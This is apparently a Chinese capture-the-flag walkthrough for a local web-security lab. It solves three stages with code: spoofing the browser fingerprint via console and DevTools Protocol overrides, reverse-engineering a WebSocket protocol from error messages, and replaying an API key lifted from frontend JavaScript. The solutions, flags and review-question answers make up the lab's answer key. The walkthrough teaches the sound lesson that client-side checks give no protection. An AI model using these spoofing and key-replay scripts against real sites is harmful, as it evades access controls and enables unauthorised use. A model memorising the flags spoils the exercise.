# WALKTHROUGH —— 完整解法

> ⚠️ **剧透警告**。先自己试，卡住了再往下看。
> 每一关都给了不止一种解法。

---

## 第 1 关：设备指纹网关

### 现象

打开 `http://127.0.0.1:8080/static/`，白屏。

F12 → Elements 面板：

```html
<html lang="zh-CN">          ← 没有 wa-ok
  <body style="visibility: hidden">   ← 被隐藏了
```

### 根因

`static.html` 里这段 CSS：

```css
html:not(.wa-ok) body { visibility: hidden !important; }
```

翻译：**只要 `<html>` 上没有 `wa-ok` 类，body 就不可见。**

谁负责加这个类？`public/mgate.js`。

### 读网关逻辑

```javascript
function check() {
  var ua = navigator.userAgent.toLowerCase();
  var platform = navigator.platform.toLowerCase();

  if (BOT.test(ua))                          return false;  // 爬虫
  if (!MOBILE.test(ua) && !isTablet())       return false;  // 不是移动端
  if (DESKTOP_PLATFORM.test(platform) && !isTablet())
                                             return false;  // 桌面系统
  if (DESKTOP_GPU.test(gpuRenderer()))       return false;  // 桌面显卡
  if (uad && uad.mobile === false)           return false;  // UA-CH 说桌面
  return true;
}
```

四道检查，全过才放行。

### 解法 A：DevTools 控制台注入（最快）

先按 `Ctrl+Shift+M` 打开设备模拟，选一个 iPhone，刷新页面。

这时控制台跑：

```javascript
// 覆盖 platform（设备模拟改不了这个）
Object.defineProperty(navigator, 'platform', { get: () => 'MacIntel' });

// 触摸点
Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 });

// 显卡型号
const _gp = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function (p) {
  if (p === 37445) return 'Apple Inc.';
  if (p === 37446) return 'Apple GPU';
  return _gp.apply(this, arguments);
};

// 手动补上 class（因为 mgate 已经在加载时跑完了）
document.documentElement.classList.add('wa-ok');
document.documentElement.removeAttribute('data-wa-block');
```

页面立刻显示。同时 `/api/allocate` 会因为设备模拟改了 UA 请求头而返回 FLAG1。

**为什么设备模拟就够了 UA？** 因为 DevTools 的设备模拟改的是**真实发出的请求头**，而 `Object.defineProperty` 只改 JS 里的值。两者不是一回事。

### 解法 B：CDP 全自动（最接近真实手法）

如果你用 Chrome DevTools Protocol：

```javascript
// 注入到 document_start，抢在 mgate.js 之前
await send('Page.addScriptToEvaluateOnNewDocument', {
  source: `
    Object.defineProperty(navigator,'platform',{get:()=>'MacIntel'});
    Object.defineProperty(navigator,'maxTouchPoints',{get:()=>5});
    Object.defineProperty(navigator,'userAgentData',{get:()=>undefined});
    const _gp=WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter=function(p){
      if(p===37445)return 'Apple Inc.';
      if(p===37446)return 'Apple GPU';
      return _gp.apply(this,arguments);
    };
  `
});
// 同时覆盖网络层的 UA
await send('Emulation.setUserAgentOverride', {
  userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  platform: 'MacIntel'
});
```

**注意 `userAgentData` 必须设成 `undefined`。** 如果造一个 `{mobile:false, platform:'macOS'}`，会正好踩中最后一条检查。

### 解法 C：纯命令行（不打浏览器）

```bash
curl -A "Mozilla/5.0 (Linux; Android 13; SM-G991B) Mobile Safari/537.36" \
     http://127.0.0.1:8080/api/allocate
```

直接拿 FLAG1。**但这样你没体验第 1 关的核心**——那些前端检测本来就是纸糊的。

### 这一关真正想说的

> 页面能不能显示、功能能不能用，**是客户端自己决定的**。
> 客户端跑在用户机器上，用户能改任何东西。
>
> 所以：**任何只在前端做的权限判断，等于没有判断。**

---

## 第 2 关：WebSocket 协议

### 现象

F12 → Network → WS 面板，看到：

```
/api/v1/ws1   CLOSED   4002   wa.v1 required
```

### 第一步：加子协议

```javascript
const w = new WebSocket('ws://127.0.0.1:8080/api/v1/ws1', ['wa.v1']);
w.onopen = () => console.log('connected, protocol =', w.protocol);
```

输出 `protocol = wa.v1`，连接保持住了。

### 第二步：搞清信封格式

读 `public/app.js` 里的 `__buildFrame`：

```javascript
JSON.stringify({
  v: 1,
  type: type,                    // ← 方法名
  request_id: 'req_...',
  session_id: sessionId || null,
  sent_at: new Date().toISOString(),
  payload: {}
})
```

### 第三步：试错（错误信息会带你走）

**先随便发一个：**

```javascript
w.send(JSON.stringify({ hello: 1 }));
```

```
VALIDATION_ERROR / invalid websocket command
```

→ 需要标准信封。

**发个信封但类型乱填：**

```javascript
w.send(JSON.stringify({ v:1, type:'call', request_id:'r1', session_id:'x', sent_at:new Date().toISOString(), payload:{} }));
```

```
VALIDATION_ERROR / unknown command type
```

→ 信封对了，**类型值不对**。

**关键洞察**：`type` 里放的应该是**方法名**，不是 `call`/`command` 这种动词。

```javascript
w.send(JSON.stringify({ v:1, type:'session.poll', request_id:'r2', session_id:null, sent_at:new Date().toISOString(), payload:{} }));
```

```
VALIDATION_ERROR / session_id is required
```

→ 命令名对了！缺 `session_id`。

**补上：**

```javascript
w.send(JSON.stringify({
  v: 1,
  type: 'session.poll',
  request_id: 'r3',
  session_id: 'anything',
  sent_at: new Date().toISOString(),
  payload: { after_seq: 0, wait_ms: 0 }
}));
```

```json
{
  "v": 1,
  "type": "result",
  "request_id": "r3",
  "session_id": "anything",
  "payload": {
    "messages": [],
    "flag": "FLAG{stage2_ws_subprotocol_wa_v1}"
  }
}
```

**通关。**

### 完整脚本（复制到控制台）

```javascript
const w = new WebSocket('ws://127.0.0.1:8080/api/v1/ws1', ['wa.v1']);

w.onopen = () => {
  w.send(JSON.stringify({
    v: 1,
    type: 'session.poll',
    request_id: 'req_' + Math.random().toString(36).slice(2, 12),
    session_id: 'lab-session',
    sent_at: new Date().toISOString(),
    payload: { after_seq: 0, wait_ms: 0 }
  }));
};

w.onmessage = e => console.log(JSON.parse(e.data));
```

### 这一关真正想说的

> 服务器每次拒绝，都精确告诉了你"下一步缺什么"：
> `wa.v1 required` → `invalid command` → `unknown command type` → `session_id is required`
>
> **这是给攻击者画的地图。**
>
> 真实产品里，认证失败应该回统一的模糊错误，不该区分"命令不存在"和"参数不对"——后者等于让你枚举出所有已注册命令。

---

## 第 3 关：前端凭据

### 现象

```bash
curl "http://127.0.0.1:8080/api/tg-cs/session/health"
```

```json
{"code":400,"message":"访问未授权"}
```

### 错误思路：猜请求头名

```
Authorization: Bearer xxx
X-Token: xxx
X-Auth: xxx
token: xxx
```

**这一关不考这个。** 而且真实场景里，猜请求头名的成功率极低，纯浪费时间。

### 正确思路：看它自己怎么发

F12 → Network → 刷新页面 → 找 `session/health` 这条 → 点开 Request Headers：

```http
GET /api/tg-cs/session/health HTTP/1.1
Host: 127.0.0.1:8080
X-Api-Key: lab_7f3a9c2e51b84d6a90c1e35d      ← 就是它
Accept: application/json
```

### 为什么它一定在那儿

**因为前端需要用它。**

前端每次调这个接口都要带这个 key，那 key 就必须能被前端代码读到；能被前端读到，就能被你读到。

去 `public/app.js` 里搜：

```javascript
var API_KEY = 'lab_7f3a9c2e51b84d6a90c1e35d';
```

明文。没有任何保护。

### 通关

```bash
curl -H "X-Api-Key: lab_7f3a9c2e51b84d6a90c1e35d" \
     "http://127.0.0.1:8080/api/tg-cs/session/health"
```

```json
{
  "code": 200,
  "message": "success",
  "data": {
    "reachable": true,
    "time": "2026-11-24T12:51:01.248Z",
    "flag": "FLAG{stage3_frontend_api_key_recovered}"
  }
}
```

**`code: 200` = 通关。**

### 这一关真正想说的

> **前端要用的密钥，不叫密钥。**
>
> 它只是一个被公开的字符串。任何打开 F12 的人、任何下载了 JS 的人，都能拿到。
>
> 正确做法：
> - 用户态凭据用 session / cookie，服务端校验
> - 敏感操作走服务端到服务端
> - 前端只能持有**公开**的信息

---

## 四道思考题的参考答案

### Q1：第 1 关的绕过手法，为什么在真实系统里不算漏洞？

因为**客户端本来就不可信**。服务器从来不应该相信客户端发来的"我是手机"这种自我声明。

真正的设备校验必须发生在服务端：看 User-Agent 头（可伪造但成本更高）、看 TLS 指纹、看行为特征。**而前端 JS 的任何判断，都只是"防君子不防小人"。**

所以第 1 关严格说不是"漏洞"，是"设计缺陷"——把不安全的机制当成了安全机制。

### Q2：第 3 关的 key，正确做法是什么？

| 错误做法 | 正确做法 |
|---|---|
| 硬编码在前端 JS | 用户态用 session/cookie，服务端查会话 |
| 所有用户共用一个 key | 每用户独立凭据，可吊销 |
| key 能直接读数据 | key 只做身份标识，权限在服务端判 |

**核心原则：前端只能持有"公开信息"。任何"秘密"放到前端，就已经不是秘密了。**

### Q3：如果第 2 关只返回 `close 4002`，什么提示都不给，攻击成本会高多少？

**高一个数量级。**

现在的错误链是：

```
wa.v1 required → invalid command → unknown command type → session_id is required
```

每一步都告诉你下一步该补什么。四步走完，协议就还原了。

如果只给一个 `4002`：

- 你得猜是子协议问题（还是 header？还是路径？还是 token？）
- 猜中子协议后，还得猜消息格式（JSON？二进制？protobuf？）
- 猜中格式后，还得枚举命令名（`session.poll` 这种命名，靠猜基本无望）

**这就是"错误信息最小化"为什么是安全设计原则。**

### Q4：这三关里，哪一关无法从客户端绕过？

**没有。**

三关全都能绕，因为它们全部信任了客户端。

这也是设计这个靶场的用意——**真正的安全边界只能在服务端**。第 3 关的服务端至少还校验了 key（虽然 key 泄露了），如果连 key 都不校验，那就是彻底的裸奔。

对比一下真实世界里"绕不过去"的那种设计：服务端持有密钥、客户端只拿令牌、令牌有签名和过期时间、签名验证在服务端做。**这种东西你在前端改一万遍也没用。**

---

## 附：三关 flag 一览

```
FLAG{stage1_device_gateway_bypassed}
FLAG{stage2_ws_subprotocol_wa_v1}
FLAG{stage3_frontend_api_key_recovered}
```
